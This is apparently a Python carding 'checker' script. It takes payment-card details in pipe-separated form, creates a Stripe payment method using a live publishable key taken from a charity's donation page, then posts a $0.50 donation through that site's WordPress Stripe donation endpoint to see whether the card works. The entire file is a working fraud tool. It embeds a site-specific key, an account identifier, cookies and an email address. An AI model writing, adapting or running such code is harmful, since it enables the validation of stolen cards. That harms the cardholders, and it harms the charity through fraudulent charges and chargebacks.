import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
	    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en-GB;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Chromium";v="139", "Not/A)Brand";v="99"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&billing_details[name]=Benni+Ent+&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F81274c9437%3B+stripe-js-v3%2F81274c9437%3B+payment-element&referrer=https%3A%2F%2Fempowernest.org&key=pk_live_51Nudb0J5g91RXBK2alZ7l9zDkyoqVVa7Wun9Z3TlWCMDTm1pYdCUIPQpE13UvqRidKKkaDoma1a8Rp2YviNeoqwY00pQQNojq3&_stripe_account=acct_1QKl0qDLYaPr4juu'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

	pm = r1.json()['id']

	cookies = {
    '__stripe_mid': '2e1e33c1-6d15-4c98-8247-7d1db6e04892190d18',
    '__stripe_sid': 'bc072984-faa2-47c9-a735-63e04454e81ae6573d',
	}
	
	headers = {
	    'authority': 'empowernest.org',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en-GB;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': '__cf_bm=jp9SDEq4CQo.hUz18OVqb602x5756uYupQNPZG44_6Q-1767668952-1.0.1.1-JpBsHcGhX_GHM4mdh0ZFDO8XMLGYQi1_curtfAa8QuRkOrvl52dsDgaH_sBW6B3SzDk5ynGStXeeGOo6UOWX5FeQrKApxSTgkzLDG_Uh_B4; cmplz_consented_services=; cmplz_policy_id=14; cmplz_marketing=allow; cmplz_statistics=allow; cmplz_preferences=allow; cmplz_functional=allow; cmplz_banner-status=dismissed; __stripe_mid=7db7936d-7e7c-4c86-afef-698110aebe5ea4f190; __stripe_sid=fe2548fd-f7e8-410a-9b29-bf7117d1bdd465bccc',
    'origin': 'https://empowernest.org',
    'referer': 'https://empowernest.org/donation/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
	}

				
	data = {
	    'action': 'wp_full_stripe_inline_donation_charge',
    'wpfs-form-name': 'Donation',
    'wpfs-form-get-parameters': '%7B%7D',
    'wpfs-custom-amount': 'other',
    'wpfs-custom-amount-unique': '0.5',
    'wpfs-donation-frequency': 'one-time',
    'wpfs-card-holder-email': 'dopaproggz@gmail.com',
    'wpfs-card-holder-name': 'Benni Ent ',
    'wpfs-stripe-payment-method-id': f'{pm}', 
    }
	
	r2 = requests.post(
	    'https://empowernest.org/wp-admin/admin-ajax.php',
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	return (r2.json())
